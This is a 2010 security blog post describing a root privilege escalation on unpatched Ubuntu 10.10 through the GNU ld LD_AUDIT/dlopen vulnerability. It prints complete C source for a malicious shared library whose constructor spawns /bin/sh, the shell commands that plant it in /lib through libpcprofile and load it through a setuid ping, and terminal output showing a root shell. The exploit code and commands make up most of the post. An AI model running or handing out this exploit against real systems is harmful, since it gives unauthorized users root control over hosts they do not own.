---
layout: post
title: Escalation via a library upload and the GNU ld dlopen vulnerability
date: '2010-11-08T22:16:00.010+01:00'
author: Xavier Garcia
tags:
- escalation
- ld_audit
- library upload
modified_time: '2010-11-09T11:49:38.745+01:00'
blogger_id: tag:blogger.com,1999:blog-8534555958859253862.post-5697730068506278006
blogger_orig_url: http://www.shellguardians.com/2010/11/escalation-with-library-upload-gnu-ld.html
---
In my previous [post](http://www.shellguardians.com/2010/11/privilege-escalation-with-upstart-and.html) I was trying to find ways to gain root shell by using the [dlopen vulnerability](http://www.shellguardians.com/2010/10/gnu-ld-dlopen-privilege-escalation.html), but I could not find something interesting because I was looking at the wrong place.  
  
At this point, we have two facts:  

*   I can create world writeable files as root
*   I can load libraries that are not meant to be used by a setuid program

I was looking for ways to subvert services to gain root, when the answer was right there in the advisory.  
  
By having the ability to upload my own evil library to the host and then execute it as described in the PoC, I can gain a root shell easily. But, since I can only load a library if it is located in the path defined in /etc/ld.so.conf , I have to find a way to copy my library to a valid directory, that is going to be owned by root.  
  
Well, the solution to this problem can be found by making use of the vulnerability to create a world writeable file in the path (i.e. /lib) and then overwrite it with the contents of the library.  
  
Once the library is loaded, we only need to make use of the vulnerability again to get a root shell and then secure our access to the system.  
  
The library is really simple. It only defines a constructor that is executed by the setuid program.  
  
```c
#include <errno.h>  
#include <unistd.h>  
  
static void  
__attribute__ ((constructor))  
install (void)  
{  
  execl("/bin/sh", "/bin/sh", (char *) 0);  
}
```

  
At this point, we only have to compile the library and follow the steps explained before  
  
  
```bash
umask 0  
gcc -c -fPIC evil.c -o evil.o  
gcc -shared -Wl,-soname,libevil.so.1 -o libevil.so evil.o  
LD_AUDIT="libpcprofile.so" PCPROFILE_OUTPUT="/lib/libevil.so" ping  
cat ./libevil.so > /lib/libevil.so  
LD_AUDIT="libevil.so" ping
```

  
As a result,  we have root shell  
  
```bash
user@host:~/$ sh run.sh  
ERROR: ld.so: object 'libpcprofile.so' cannot be loaded as audit interface: undefined symbol: la_version; ignored.  
Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]  
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]  
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]  
            [-T tstamp-options] [-Q tos] [hop1 ...] destination  
# whoami  
root  
#
```

  
Note: this attack has been tested in an unpatched  Ubuntu 10.10
